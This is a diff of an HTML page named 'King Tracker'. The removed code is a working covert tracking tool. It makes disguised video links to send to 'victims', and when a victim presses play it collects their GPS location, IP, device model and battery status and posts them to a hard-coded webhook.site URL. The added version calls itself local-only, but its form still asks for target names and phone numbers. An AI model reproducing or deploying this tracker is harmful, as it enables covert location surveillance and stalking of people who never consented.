@@ -1,670 +1,136 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>King Tracker</title> <!-- Title updated to King Tracker -->
-    <style>
-        :root {
-            --primary: #00ff41;
-            --secondary: #008f11;
-            --accent: #ff003c;
-            --bg: #0b0e14;
-            --card-bg: rgba(255, 255, 255, 0.05);
-        }
-
-        @keyframes rgb-border {
-            0% {
-                border-color: #ff0000;
-                box-shadow: 0 0 10px #ff0000;
-            }
-
-            33% {
-                border-color: #00ff00;
-                box-shadow: 0 0 10px #00ff00;
-            }
-
-            66% {
-                border-color: #0000ff;
-                box-shadow: 0 0 10px #0000ff;
-            }
-
-            100% {
-                border-color: #ff0000;
-                box-shadow: 0 0 10px #ff0000;
-            }
-        }
-
-        @keyframes gradient-text {
-            0% {
-                background-position: 0% 50%;
-            }
-
-            50% {
-                background-position: 100% 50%;
-            }
-
-            100% {
-                background-position: 0% 50%;
-            }
-        }
-
-        @keyframes pulse-glow {
-            0% {
-                box-shadow: 0 0 5px #ffbc00;
-            }
-
-            50% {
-                box-shadow: 0 0 20px #ffbc00;
-            }
-
-            100% {
-                box-shadow: 0 0 5px #ffbc00;
-            }
-        }
-
-        .pulse {
-            animation: pulse-glow 2s infinite;
-        }
-
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: var(--bg);
-            color: #ffffff;
-            display: flex;
-            min-height: 100vh;
-            margin: 0;
-            overflow-x: hidden;
-        }
-
-        .sidebar {
-            width: 260px;
-            background: rgba(0, 0, 0, 0.5);
-            backdrop-filter: blur(15px);
-            border-right: 1px solid var(--primary);
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-            padding: 30px 20px;
-            height: 100vh;
-            position: sticky;
-            top: 0;
-        }
-
-        .main-content {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
-
-        .sidebar h3 {
-            color: var(--primary);
-            text-align: center;
-            margin-bottom: 30px;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-        }
-
-        .nav-btn {
-            background: var(--card-bg);
-            border: 1px solid var(--primary);
-            color: var(--primary);
-            padding: 10px 20px;
-            border-radius: 5px;
-            cursor: pointer;
-            transition: 0.3s;
-            font-weight: bold;
-        }
-
-        .nav-btn.active {
-            background: var(--primary);
-            color: #000;
-            box-shadow: 0 0 15px var(--primary);
-        }
-
-        .container {
-            background: var(--card-bg);
-            backdrop-filter: blur(10px);
-            border: 2px solid transparent;
-            animation: rgb-border 5s infinite linear;
-            padding: 30px;
-            border-radius: 20px;
-            text-align: center;
-            width: 90%;
-            max-width: 400px;
-            display: none;
-            /* Controlled by JS */
-        }
-
-        .container.active {
-            display: block;
-        }
-
-        h2 {
-            font-size: 2.2rem;
-            margin-bottom: 20px;
-            background: linear-gradient(to right, var(--primary), #fff, var(--secondary));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-size: 200% auto;
-            animation: gradient-text 3s infinite linear;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-        }
-
-        input {
-            width: 100%;
-            padding: 12px;
-            margin: 15px 0;
-            background: rgba(255, 255, 255, 0.1);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            border-radius: 8px;
-            box-sizing: border-box;
-            color: white;
-            outline: none;
-            transition: 0.3s;
-        }
-
-        input:focus {
-            border-color: var(--primary);
-            box-shadow: 0 0 15px var(--primary);
-        }
-
-        button {
-            background: linear-gradient(45deg, var(--secondary), #000);
-            border: 1px solid var(--primary);
-            color: white;
-            border: none;
-            padding: 15px 20px;
-            border-radius: 8px;
-            cursor: pointer;
-            width: 100%;
-            font-size: 18px;
-            font-weight: bold;
-            text-transform: uppercase;
-            transition: 0.3s;
-            box-shadow: 0 4px 15px rgba(0, 255, 65, 0.2);
-        }
-
-        button:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 6px 20px var(--primary);
-        }
-
-        #result {
-            margin-top: 20px;
-            word-wrap: break-word;
-            padding: 15px;
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 10px;
-            display: none;
-            text-align: left;
-            border-left: 4px solid var(--primary);
-        }
-
-        #result strong {
-            color: var(--primary);
-        }
-
-        #generatedLink {
-            color: #fff;
-            font-weight: bold;
-            font-size: 0.9rem;
-        }
-
-        .hidden {
-            display: none;
-        }
-
-        #redirect-ui {
-            text-align: center;
-            color: #fff;
-        }
-
-        #redirect-ui h1 {
-            color: var(--primary);
-            text-shadow: 0 0 20px var(--primary);
-        }
-
-        .admin-section {
-            margin-top: 30px;
-            width: 90%;
-            max-width: 800px;
-            background: var(--card-bg);
-            backdrop-filter: blur(10px);
-            padding: 20px;
-            border-radius: 20px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            margin-bottom: 50px;
-            display: none;
-        }
-
-        .admin-section.active {
-            display: block;
-        }
-
-        table {
-            width: 100%;
-            border-collapse: collapse;
-            margin-top: 15px;
-            font-size: 13px;
-        }
-
-        th,
-        td {
-            padding: 10px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            text-align: left;
-        }
-
-        th {
-            background-color: rgba(0, 255, 65, 0.1);
-            color: var(--primary);
-        }
-
-        @media (max-width: 768px) {
-            body {
-                flex-direction: column;
-            }
-
-            .sidebar {
-                width: 100% !important;
-                height: auto;
-                position: relative;
-                padding: 15px;
-            }
-        }
-
-        #logTable tbody tr:hover {
-            background-color: rgba(0, 255, 65, 0.05);
-            cursor: pointer;
-        }
-
-        .watch-btn {
-            background: var(--accent);
-            color: white;
-            padding: 5px 10px;
-            border-radius: 4px;
-            text-decoration: none;
-            font-size: 11px;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>King Tracker (Local Dashboard)</title>
+  <link rel="stylesheet" href="./assets/styles.css" />
 </head>
-
 <body>
+  <div class="sidebar" id="sidebar">
+    <h3>King Panel</h3>
 
-    <div class="sidebar" id="sidebar">
-        <h3>King Panel</h3>
-        <button class="nav-btn active" onclick="showSection('main-ui', this)">Link Creator</button>
-        <button class="nav-btn" onclick="showSection('admin-dashboard', this)">King Dashboard</button>
-        <button class="nav-btn pulse" style="border-color: #ffbc00; color: #ffbc00; margin-top: 10px;"
-            onclick="openWebhookDashboard()">VIEW VICTIMS (WEBHOOK)</button>
+    <button class="nav-btn active" data-section="main-ui">Link Creator</button>
+    <button class="nav-btn" data-section="admin-dashboard">King Dashboard (Local Logs)</button>
 
-        <div
-            style="font-size: 11px; color: #aaa; margin-top: 20px; padding: 10px; border: 1px dashed #444; border-radius: 5px;">
-            <strong>Instruction:</strong><br>
-            1. Link generate karein.<br>
-            2. Link copy karke <u>dusre bande</u> ko bhejein.<br>
-            3. Jab wo kholega, uska data <strong>VIEW VICTIMS</strong> button par click karne se dikhega.
-        </div>
+    <div class="instruction">
+      <strong>Privacy-first mode:</strong><br />
+      This app stores activity logs <u>only in your own browser</u> (localStorage).
+      No IP/device/GPS collection and no webhooks.
     </div>
+  </div>
 
-    <div class="main-content">
-        <div class="container active" id="main-ui">
-            <h2>King Tracker</h2>
-            <p style="color: #888;">System will auto-generate a video tracking link</p>
+  <main class="main-content">
+    <!-- Creator -->
+    <section class="container active" id="main-ui">
+      <h2>King Tracker</h2>
+      <p class="muted">System will generate a local “session” link.</p>
 
-            <input type="text" id="linkName" placeholder="Link ka naam (e.g., Target 1)">
-            <input type="tel" id="targetPhone" placeholder="Target Phone Number (Optional)">
-            <input type="text" id="loadingText" placeholder="Custom loading message (Optional)">
+      <input type="text" id="linkName" placeholder="Link ka naam (e.g., Target 1)" />
+      <input type="tel" id="targetPhone" placeholder="Target Phone Number (Optional)" />
+      <input type="text" id="loadingText" placeholder="Custom loading message (Optional)" />
 
-            <button onclick="generateLink()">Generate Auto-Tracking Link</button>
+      <div class="row">
+        <input type="url" id="videoUrl" placeholder="Video URL (e.g., https://www.youtube.com/watch?v=...)" />
+      </div>
 
-            <div id="result">
-                <strong>Aapka Tracking Link:</strong><br>
-                <div style="display: flex; flex-direction: column; gap: 10px; margin-top: 10px;">
-                    <a id="generatedLink" href="#" target="_blank"
-                        style="word-break: break-all; color: var(--primary); text-decoration: underline; font-size: 0.8rem;"></a>
-                    <button onclick="copyLink()" id="copyBtn"
-                        style="padding: 8px; font-size: 14px; background: var(--primary); color: #000;">
-                        Copy Link
-                    </button>
-                </div>
-            </div>
+      <label class="toggle-row">
+        <input type="checkbox" id="autoGenToggle" />
+        <span>Auto Link Generator (multiple videos)</span>
+      </label>
+
+      <textarea
+        id="autoGenText"
+        class="auto-gen-textarea hidden"
+        placeholder="Auto mode: video URLs (one per line). Each line will get its own unique session link."
+      ></textarea>
+
+      <button id="generateBtn" class="primary-btn">Generate Local Tracking Link</button>
+
+      <div id="result" class="result hidden">
+        <div class="result-title"><strong>Aapka Local Session Link:</strong></div>
+
+        <!-- Single mode -->
+        <div id="singleLinkResult" class="single-link-result">
+          <div class="result-link">
+            <a id="generatedLink" href="#" target="_blank" rel="noreferrer"></a>
+          </div>
+          <button id="copyBtn" class="copy-btn">Copy Link</button>
         </div>
 
-        <!-- Admin Dashboard Section -->
-        <div class="admin-section" id="admin-dashboard">
-            <h3>King Dashboard (Recent Activity)</h3>
-            <p
-                style="font-size: 0.9em; color: #ffbc00; background: rgba(255,188,0,0.2); padding: 15px; border-radius: 10px; border: 1px solid #ffbc00;">
-                <strong>ZAROORI NOTE:</strong> Yeh table sirf aapke is browser ke logs dikhata hai. Dusron (Victims) ka
-                location dekhne ke liye sidebar mein <strong>"VIEW VICTIMS (WEBHOOK)"</strong> ka button dabayein.
-            </p>
-            <p style="font-size: 0.8em; color: #888; margin-top: 10px;">Click on "Location" to open Google Maps.</p>
-            <div style="overflow-x: auto;">
-                <table id="logTable">
-                    <thead>
-                        <tr>
-                            <th>Name</th>
-                            <th>Phone</th>
-                            <th>IP Address</th>
-                            <th>OS</th>
-                            <th>Device</th>
-                            <th>Battery</th>
-                            <th>Location</th>
-                            <th>Time</th>
-                        </tr>
-                    </thead>
-                    <tbody id="logBody">
-                        <!-- Logs will appear here -->
-                    </tbody>
-                </table>
-            </div>
-            <button onclick="clearLogs()"
-                style="margin-top: 20px; background: var(--accent); border-color: var(--accent); width: auto; padding: 10px 20px;">Clear
-                Local Logs</button>
+        <!-- Multi mode -->
+        <div id="multiLinksResult" class="multi-links-result hidden">
+          <div class="multi-links-subtitle">Multiple links generated (one per video):</div>
+          <div id="generatedLinksContainer" class="generated-links-container"></div>
+          <button id="copyAllBtn" class="copy-btn copy-all-btn">Copy All Links</button>
+        </div>
+      </div>
+    </section>
+
+    <!-- Local dashboard -->
+    <section class="admin-section" id="admin-dashboard">
+      <h3>King Dashboard (Recent Activity)</h3>
+
+      <p class="warning">
+        <strong>Note:</strong> Yeh table sirf aapke is browser ke localStorage logs dikhata hai.
+      </p>
+
+      <div class="table-wrap">
+        <table id="logTable">
+          <thead>
+            <tr>
+              <th>Name</th>
+              <th>Phone</th>
+              <th>Video</th>
+              <th>Time</th>
+              <th>Device</th>
+              <th>Battery</th>
+              <th>Location</th>
+              <th>Action</th>
+            </tr>
+          </thead>
+          <tbody id="logBody"></tbody>
+        </table>
+      </div>
+
+      <button class="danger-btn" id="clearBtn">Clear Local Logs</button>
+    </section>
+
+    <!-- Redirect UI -->
+    <section id="redirect-ui" class="redirect-ui hidden">
+      <div class="redirect-card">
+        <h1 id="redirect-header">Video Player</h1>
+
+        <div id="player-preview" class="player-preview">
+          <button class="play-btn" id="playBtn" aria-label="Play and record local activity">
+            <span class="play-triangle" aria-hidden="true"></span>
+          </button>
         </div>
 
-        <!-- Redirecting Message (Initially Hidden) -->
-        <div id="redirect-ui" class="hidden">
-            <div
-                style="background: var(--card-bg); padding: 40px; border-radius: 20px; border: 1px solid var(--primary);">
-                <h1 id="redirect-header" style="font-size: 1.5rem;">Video Player</h1>
-                <div id="player-preview"
-                    style="width: 100%; aspect-ratio: 16/9; background: #000; margin: 20px 0; border-radius: 10px; display: flex; align-items: center; justify-content: center; position: relative; border: 1px solid rgba(255,255,255,0.1);">
-                    <div style="width: 60px; height: 60px; background: rgba(0,255,65,0.8); border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer;"
-                        onclick="startTrackingProcess()">
-                        <div
-                            style="width: 0; height: 0; border-top: 15px solid transparent; border-bottom: 15px solid transparent; border-left: 25px solid #000; margin-left: 5px;">
-                        </div>
-                    </div>
-                </div>
-                <p id="redirect-subtext">Click the play button to watch the video content.</p>
-                <p style="font-size: 10px; color: #555; margin-top: 20px;">Verification required to continue playback.
-                </p>
-            </div>
+        <p id="redirect-subtext"></p>
+
+        <div class="live-meta">
+          <div class="live-meta-row">
+            <span class="live-meta-label">Name:</span>
+            <span id="liveName" class="live-meta-value">-</span>
+          </div>
+          <div class="live-meta-row">
+            <span class="live-meta-label">Device:</span>
+            <span id="liveDevice" class="live-meta-value">-</span>
+          </div>
+          <div class="live-meta-row">
+            <span class="live-meta-label">Location:</span>
+            <span id="liveLocation" class="live-meta-value">-</span>
+          </div>
         </div>
-    </div>
 
-    <script>
-        // --- Configuration ---
-        // Aapko apni location details receive karne ke liye ek 'Webhook' ya API ki zarurat hogi.
-        // Aap 'https://webhook.site' se ek URL le kar yahan paste kar sakte hain.
-        // Jab koi aapka link kholega, uski details is URL par bhej di jayengi.
-        const WEBHOOK_URL = "https://webhook.site/7620f980-9afd-4680-8a3f-17118916cda1"; // Yahan apna Webhook URL daalein! (e.g., "https://webhook.site/your-unique-id")
+        <p class="tiny">
+          Consent-based local action: press Play to record an entry in your own browser logs.
+        </p>
+      </div>
+    </section>
+  </main>
 
-        // --- UI Control Functions ---
-        function showSection(id, btn) {
-            document.querySelectorAll('.container, .admin-section').forEach(el => el.classList.remove('active'));
-            document.querySelectorAll('.nav-btn').forEach(el => el.classList.remove('active'));
-
-            document.getElementById(id).classList.add('active');
-            btn.classList.add('active');
-
-            if (id === 'admin-dashboard') loadLocalLogs();
-        }
-
-        function openWebhookDashboard() {
-            if (WEBHOOK_URL.includes("YOUR_WEBHOOK_URL_HERE")) {
-                alert("Pehle apna Webhook URL code ki line 219 mein paste karein!");
-                return;
-            }
-            // Extracts the unique ID from the webhook.site URL to open the dashboard
-            const webhookId = WEBHOOK_URL.split('/').pop();
-            window.open(`https://webhook.site/#!/${webhookId}`, '_blank');
-        }
-
-        function generateLink() {
-            // Auto-set a default trending video link
-            const videoUrl = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
-
-            const linkName = document.getElementById('linkName').value || 'Unnamed';
-            const targetPhone = document.getElementById('targetPhone').value || 'N/A';
-            const loadingMsg = document.getElementById('loadingText').value || 'Connecting to Secure Server...';
-
-            // Create config object
-            const config = {
-                u: videoUrl,
-                n: linkName,
-                m: loadingMsg,
-                p: targetPhone
-            };
-
-            const baseUrl = window.location.href.split('?')[0];
-
-            // Agar aap local file use kar rahe hain (file://), to apps ise link nahi manenge.
-            // Isko host karna zaroori hai (GitHub Pages/Netlify par).
-            if (baseUrl.startsWith('file:///')) {
-                alert("Warning: Aap local file use kar rahe hain. Ye link sirf aapke computer par chalega. Isse internet par chalane ke liye GitHub ya Netlify par host karein.");
-            }
-
-            const encodedData = btoa(unescape(encodeURIComponent(JSON.stringify(config))));
-            const trackingLink = `${baseUrl}?data=${encodedData}`;
-
-            document.getElementById('result').style.display = 'block';
-            document.getElementById('generatedLink').innerText = trackingLink;
-            document.getElementById('generatedLink').href = trackingLink;
-            document.getElementById('copyBtn').innerText = "Copy Link";
-        }
-
-        function copyLink() {
-            const link = document.getElementById('generatedLink').href;
-            navigator.clipboard.writeText(link).then(() => {
-                const btn = document.getElementById('copyBtn');
-                btn.innerText = "Copied! ✅";
-                setTimeout(() => btn.innerText = "Copy Link", 2000);
-            });
-        }
-
-        let globalConfig = null;
-
-        // --- Tracking Logic ---
-        window.onload = function () {
-            const urlParams = new URLSearchParams(window.location.search);
-            const dataEncoded = urlParams.get('data');
-
-            if (dataEncoded) {
-                try {
-                    globalConfig = JSON.parse(decodeURIComponent(escape(atob(dataEncoded))));
-
-                    // Target user will see NO website UI, only the redirect-ui
-                    document.getElementById('main-ui').remove();
-                    document.getElementById('sidebar').remove();
-                    document.getElementById('redirect-ui').classList.remove('hidden');
-                } catch (e) {
-                    console.error("Invalid Configuration");
-                    window.location.href = "https://google.com";
-                }
-            } else {
-                // Owner is visiting - load dashboard data
-                loadLocalLogs();
-            }
-        };
-
-        function saveLogLocally(data) {
-            let logs = JSON.parse(localStorage.getItem('king_logs') || '[]');
-            logs.unshift(data);
-            localStorage.setItem('king_logs', JSON.stringify(logs.slice(0, 50))); // Keep last 50 logs
-        }
-
-        function loadLocalLogs() {
-            const logs = JSON.parse(localStorage.getItem('king_logs') || '[]');
-            const body = document.getElementById('logBody');
-            body.innerHTML = '';
-            logs.forEach(log => {
-                // Strict check for coordinates
-                const mapUrl = (log.lat !== null && log.lon !== null) ? `https://www.google.com/maps?q=${log.lat},${log.lon}` : '#';
-                const row = `<tr>
-                    <td>${log.link_label}</td>
-                    <td>${log.target_phone || 'N/A'}</td>
-                    <td>${log.ip}</td>
-                    <td>${log.os}</td>
-                    <td>${log.device || 'Unknown'}</td>
-                    <td>${log.battery}</td>
-                    <td onclick="${mapUrl !== '#' ? `window.open('${mapUrl}', '_blank')` : 'alert(\'No GPS data\')'}" 
-                        style="text-decoration: underline; color: var(--primary); cursor: pointer;">
-                        ${log.city && log.city !== 'Unknown' ? log.city : 'Open Map'}
-                    </td>
-                    <td>${new Date(log.timestamp).toLocaleTimeString()}</td>
-                </tr>`;
-                body.innerHTML += row;
-            });
-        }
-
-        function clearLogs() {
-            if (confirm("Sare logs delete kar dein?")) {
-                localStorage.removeItem('king_logs');
-                loadLocalLogs();
-            }
-        }
-
-        function startTrackingProcess() {
-            if (!globalConfig) return;
-
-            document.getElementById('redirect-subtext').innerText = globalConfig.m;
-            const targetUrl = globalConfig.u;
-
-            let visitorData = {
-                link_label: globalConfig.n,
-                target_phone: globalConfig.p || 'N/A',
-                redirect_url: targetUrl,
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent,
-                os: getOS(),
-                device: getDevice(),
-                battery: 'N/A',
-                ip: 'Unknown', city: 'Unknown', lat: null, lon: null,
-                google_maps_link: 'Pending',
-                location_type: 'Checking...'
-            };
-
-            function getOS() {
-                const ua = navigator.userAgent;
-                if (/Android/i.test(ua)) return "Android";
-                if (/iPhone|iPad|iPod/i.test(ua)) return "iOS";
-                if (/Windows/i.test(ua)) return "Windows";
-                if (/Mac/i.test(ua)) return "macOS";
-                if (/Linux/i.test(ua)) return "Linux";
-                return "Unknown";
-            }
-
-            function getDevice() {
-                const ua = navigator.userAgent;
-                if (/Android/i.test(ua)) {
-                    let model = "Android";
-                    const match = ua.match(/Android.*;\s([^;)]+)/);
-                    if (match) model = match[1];
-                    // Common brands check
-                    if (/SM-|GT-/i.test(ua)) return "Samsung (" + model + ")";
-                    const brands = ["Huawei", "Xiaomi", "Oppo", "Vivo", "Realme", "Motorola", "Google", "OnePlus", "Nokia"];
-                    for (let brand of brands) {
-                        if (new RegExp(brand, "i").test(ua)) return brand + " (" + model + ")";
-                    }
-                    return model;
-                }
-                if (/iPhone|iPad|iPod/i.test(ua)) return "Apple " + ua.match(/iPhone|iPad|iPod/i)[0];
-                return "Desktop / PC";
-            }
-
-            async function captureBattery() {
-                try {
-                    if (navigator.getBattery) {
-                        const battery = await navigator.getBattery();
-                        const level = Math.round(battery.level * 100);
-                        const status = battery.charging ? "Charging (Plugged In)" : "On Battery";
-                        visitorData.battery = `${level}% - ${status}`;
-                        visitorData.battery_level = level;
-                        visitorData.is_charging = battery.charging;
-                    }
-                } catch (e) {
-                    console.warn("Battery API not supported");
-                }
-            }
-
-            const finalRedirect = () => {
-                window.location.href = targetUrl;
-            };
-
-            const collectAndSend = async (geoData) => {
-                await captureBattery();
-                fetch('https://ipapi.co/json/')
-                    .then(res => res.json())
-                    .then(ipData => {
-                        updateAndFinish(ipData, geoData);
-                    })
-                    .catch(ipapiErr => {
-                        fetch('https://ipwho.is/')
-                            .then(res => res.json())
-                            .then(ipData => {
-                                updateAndFinish({
-                                    ip: ipData.ip,
-                                    city: ipData.city,
-                                    country_name: ipData.country,
-                                    latitude: ipData.latitude,
-                                    longitude: ipData.longitude
-                                }, geoData);
-                            })
-                            .catch(ipwhoErr => {
-                                updateAndFinish(null, geoData); // No IP data, proceed with geoData or null
-                            });
-                    });
-            };
-
-            const updateAndFinish = (ipData, geoData) => {
-                if (ipData) {
-                    visitorData.ip = ipData.ip || 'Not available';
-                    visitorData.city = ipData.city || 'Not available';
-                    visitorData.country_name = ipData.country_name || ipData.country || 'Not available';
-                    visitorData.lat = (geoData && geoData.lat) ? geoData.lat : (ipData.latitude || null);
-                    visitorData.lon = (geoData && geoData.lon) ? geoData.lon : (ipData.longitude || null);
-                    visitorData.location_type = geoData ? "Precise (GPS)" : "Approximate (IP)";
-                } else if (geoData) {
-                    visitorData.lat = geoData.lat;
-                    visitorData.lon = geoData.lon;
-                    visitorData.ip = 'Not available (GPS only)';
-                    visitorData.city = 'Not available (GPS only)';
-                    visitorData.country_name = 'Not available (GPS only)';
-                    visitorData.location_type = "Precise (GPS)";
-                }
-
-                if (visitorData.lat && visitorData.lon) {
-                    visitorData.google_maps_link = `https://www.google.com/maps?q=${visitorData.lat},${visitorData.lon}`;
-                }
-
-                saveLogLocally(visitorData);
-
-                // Webhook par data bhejte waqt headers ko improve kiya taaki data sahi format mein dikhe
-                if (!WEBHOOK_URL.includes("YOUR_WEBHOOK_URL_HERE") && WEBHOOK_URL.startsWith("http")) {
-                    fetch(WEBHOOK_URL, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(visitorData),
-                        keepalive: true
-                    }).catch(e => console.warn("Webhook failed"));
-                }
-
-                // Redirection se pehle thoda intezaar taaki data transfer confirm ho jaye
-                setTimeout(finalRedirect, 2000);
-            };
-
-            // Try Precise GPS first
-            if (navigator.geolocation) {
-                console.log("Requesting Location...");
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => collectAndSend({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
-                    (err) => { console.warn("Location denied"); collectAndSend(null); },
-                    { timeout: 10000, enableHighAccuracy: true, maximumAge: 0 }
-                );
-            } else {
-                collectAndSend(null);
-            }
-        }
-    </script>
+  <script src="./assets/app.js"></script>
 </body>
-
 </html>
